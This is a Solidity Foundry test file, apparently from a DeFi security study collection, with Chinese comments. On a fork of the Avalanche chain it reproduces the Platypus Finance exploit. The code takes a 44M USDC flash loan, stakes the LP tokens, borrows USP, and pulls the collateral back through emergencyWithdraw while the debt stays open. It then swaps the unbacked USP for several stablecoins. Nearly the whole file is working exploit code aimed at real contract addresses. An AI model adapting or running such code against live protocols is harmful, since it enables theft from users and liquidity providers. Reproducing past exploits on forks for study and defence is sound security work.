// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../interface.sol";
import "src/defisec/Log.sol";
/*
https://avascan.info/blockchain/c/address/0x359e515fcc319f1251F943b0096104c66C28759C/contract
https://avascan.info/blockchain/c/address/0xBCD6796177aB8071F6a9ba2C3e2E0301Ee91BEf5/contract
https://explorer.phalcon.xyz/tx/avax/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430
本来是稳定币的dex，但是为了提高利用率，又允许把lp抵押取borrow，又变成了Lending。
*/
interface AaveV3Pool {
    function flashLoanSimple(address receiverAddress, address asset, uint amount, bytes memory params, uint16 referralCode) external;
}
interface PlatypusPool {
    function deposit(address token, uint amount, address to, uint deadline) external returns (uint);
    function swap(address fromToken, address toToken, uint fromAmount, uint minnumAmount, address to, uint deadline) external returns (uint, uint);
    function withdraw(address token, uint liquidity, uint minimumAmount, address to, uint deadline) external returns (uint);
}
interface USP is IERC20{
    function approve(address spender, uint256 amount) external returns (bool);
}
interface LP_USDC is IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface MasterPlatypusV4{
    function deposit(uint _pid, uint _amount) external returns(uint256, uint256[] memory);
    function emergencyWithdraw(uint pid) external;
}
interface PlatypusTreasure{
    function borrow(address token, uint borrowAmount) external;
    function isSolvent(
        address _user,
        address _token,
        bool _open
    ) external view returns (bool solvent, uint256 debtAmount) ;
}
// forge test --contracts ./src/defisec/lending/Plat_exp.sol -vv  (vv只打印log不打印trace)
contract ContractTest is Test, MyLog{
    AaveV3Pool aaveV3Pool = AaveV3Pool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    IERC20 usdc = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 usdce = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 usdt = IERC20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);
    IERC20 usdte = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 busd = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    IERC20 daie = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);

    PlatypusPool platypusPool = PlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    LP_USDC lp_usdc = LP_USDC(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
    MasterPlatypusV4 masterPlatypusV4 = MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
    PlatypusTreasure platypusTreasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);//这里应该是proxy的地址
    USP usp = USP(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);

    function setUp() public {
        vm.createSelectFork('Avalanche', 26343614 - 1);
    }

    function testAttach() public {

        aaveV3Pool.flashLoanSimple(address(this), address(usdc), 44_000_000e6,  abi.encode(""), 0);
        console.log('final');
        finalInterest();
    }


    function executeOperation(address asset, uint amount, uint premium, address initiator, bytes memory params) external returns (bool){
        console.log("executeOperation");
        console.logBytes(params);

        usdc.approve(address(aaveV3Pool),   44_022_000e6);//44,022,000e6变成44_022_000e6
        usdc.approve(address(platypusPool), 44_000_000e6);

        platypusPool.deposit(address(usdc), 44_000_000e6, address(this), block.timestamp+1000);//

        finalInterest();
        lp_usdc.approve(address(masterPlatypusV4), 44_000_100_592_104);

        masterPlatypusV4.deposit(4, 44_000_100_592_104);//存LP，换USP,但是主动给你投票token，usp要你手动borrow。 错误就在这行，只是revert，怎么定位错误呢？
        platypusTreasure.borrow(address(lp_usdc), 41_794_533_641_783_253_909_672_000);//mint usp, master的withdraw会调用Treasure,deposit不会。


        logPositionHealthCheck(address(lp_usdc));
        masterPlatypusV4.emergencyWithdraw(4);//取LP.  抵押LP借的USP还未换，就取款。
        logPositionHealthCheck(address(lp_usdc));


        lp_usdc.approve(address(platypusPool), 44_000_10_592_104);

        platypusPool.withdraw(address(usdc), 44_000_100_592_104, 0, address(this), block.timestamp+1000);//取出USDC

        usp.approve(address(platypusPool), 9_000_000e18);

        //白嫖的 USP
        platypusPool.swap(address(usp), address(usdc), 2_500_000e18, 0, address(this), block.timestamp+1000);

        platypusPool.swap(address(usp), address(usdce), 2_000_000e18, 0, address(this), block.timestamp+1000);

        platypusPool.swap(address(usp), address(usdt), 1_600_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(usp), address(usdte), 1_250_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(usp), address(busd), 700_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(usp), address(daie), 700_000e18, 0, address(this), block.timestamp+1000);


        finalInterest();

        return true;//函数有返回值，没写导致一直revert，不容易找到原因。
    }
/*
快速理一下 Treasure(宝物)
*/

//    Log刚打印什么 LTV =debt/colla 必须小于某个值。 或者说 colla/debt必须大于某个值。
//     找到protocol中的那个 health check的函数。 一般都得写。能否接续借，还款，
    function logPositionHealthCheck(address lpToken) public {
        (bool solvent, uint256 debtAmount) = platypusTreasure.isSolvent(address(this), lpToken, true);
        console.log("isHealthCheck ", solvent?"true":"false");
        emit log_named_decimal_uint("logPositionHealthCheck debtAmount" ,debtAmount, lp_usdc.decimals());
    }

    function finalInterest() public {
        console.log('finalInterest');
        emit log_named_decimal_uint("mybalance lp_usdc" , lp_usdc.balanceOf(address(this)), lp_usdc.decimals());
        emit log_named_decimal_uint("mybalance usp" , usp.balanceOf(address(this)), usp.decimals());
        emit log_named_decimal_uint("mybalance usdc" , usdc.balanceOf(address(this)), usdc.decimals());
        emit log_named_decimal_uint("mybalance usdce" , usdce.balanceOf(address(this)), usdce.decimals());
        emit log_named_decimal_uint("mybalance usdt" , usdt.balanceOf(address(this)), usdt.decimals());
        emit log_named_decimal_uint("mybalance usdte" , usdte.balanceOf(address(this)), usdte.decimals());
        emit log_named_decimal_uint("mybalance busd" , busd.balanceOf(address(this)), busd.decimals());
        emit log_named_decimal_uint("mybalance daie" , daie.balanceOf(address(this)), daie.decimals());
    }
}






















